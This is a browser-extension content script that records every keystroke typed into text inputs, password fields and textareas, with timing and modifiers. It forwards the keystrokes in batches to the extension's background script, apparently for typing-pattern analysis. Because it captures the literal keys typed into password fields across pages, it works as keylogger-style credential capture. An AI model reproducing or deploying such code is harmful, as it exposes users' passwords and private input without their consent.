import browser from 'webextension-polyfill';
import type { KeyEvent } from '../types';

let keyEvents: KeyEvent[] = [];
let startTime: number | null = null;
let lastKeyTime: number | null = null;

function handleKeyDown(e: KeyboardEvent) {
  const now = Date.now();
  if (!startTime) startTime = now;

  const keyEvent: KeyEvent = {
    key: e.key,
    code: e.code,
    timestamp: now,
    timeSinceLast: lastKeyTime ? now - lastKeyTime : 0,
    modifiers: {
      ctrl: e.ctrlKey,
      alt: e.altKey,
      shift: e.shiftKey,
      meta: e.metaKey,
    }
  };

  lastKeyTime = now;
  keyEvents.push(keyEvent);

  // Send events to background script when we have enough data
  if (keyEvents.length >= 75) {
    browser.runtime.sendMessage({
      type: 'TYPING_DATA',
      data: keyEvents
    });
    keyEvents = [];
  }
}

// Add listener to all text inputs and text areas
function attachListeners() {
  const inputs = document.querySelectorAll('input[type="text"], input[type="password"], textarea');
  inputs.forEach(input => {
    input.addEventListener('keydown', handleKeyDown);
  });
}

attachListeners();

// Handle dynamic content
const observer = new MutationObserver(() => {
  attachListeners();
});

observer.observe(document.body, {
  childList: true,
  subtree: true
});